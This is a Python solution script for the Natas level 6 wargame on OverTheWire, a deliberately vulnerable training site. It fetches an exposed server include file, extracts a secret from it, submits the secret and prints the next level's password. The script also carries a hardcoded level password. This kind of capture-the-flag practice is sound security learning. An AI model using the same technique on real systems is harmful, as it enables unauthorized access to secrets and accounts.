#!/usr/bin/env python3

import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org' % username

# response = requests.get(url, auth=(username, password))
# content = response.text

url_secret = url + '/includes/secret.inc'
response = requests.get(url_secret, auth=(username, password))
content = response.text

secret = re.findall('secret = "(.*)"', content)[0]
data = {
    'secret': secret,
    'submit': 'submit'
}
response = requests.post(url, auth=(username, password), data=data)
content = response.text

flag = re.findall('Access granted. The password for natas7 is (.*)', content)[0]

print(flag)